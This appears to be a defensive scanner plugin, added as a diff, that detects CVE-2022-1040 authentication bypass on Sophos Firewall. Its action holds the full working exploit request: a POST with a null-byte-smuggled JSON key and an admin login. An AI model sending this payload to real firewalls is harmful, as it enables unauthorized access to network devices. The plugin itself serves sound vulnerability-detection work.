@@ -1,0 +1,69 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Sophos_CVE_2022_1040"
+  author: "Giacomo Coluccelli <giacomo@doyensec.com>"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE_2022_1040"
+  }
+  severity: CRITICAL
+  title: "CVE-2022-1040 - Authentication Bypass on Sophos Firewall"
+  description: 
+    "An authentication bypass vulnerability in the User Portal and Webadmin allows a "
+    "remote attacker to execute code in Sophos Firewall version v18.5 MR3 and older."
+  recommendation: 
+    "Upgrade Sophos Firewall. Fix included in v19.0 GA and v18.5 MR4 (18.5.4)."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2022-1040"
+  }
+}
+
+config: {
+  disabled: false
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "attempt_authentication_bypass"
+  http_request: {
+    method: POST
+    uri: "/webconsole/Controller"
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" }
+    ]
+    data: "mode=151&json={\"username\"%3a\"admin\",\"password\"%3a\"somethingnotpassword\",\"languageid\"%3a\"1\",\"browser\"%3a\"Chrome_101\",\"accessaction\"%3a1,+\"mode\\u0000ef\"%3a716}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "{\"redirectionURL\":\"/webpages/index.jsp\",\"status\":200}" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "attempt_authentication_bypass"
+  ]
+}
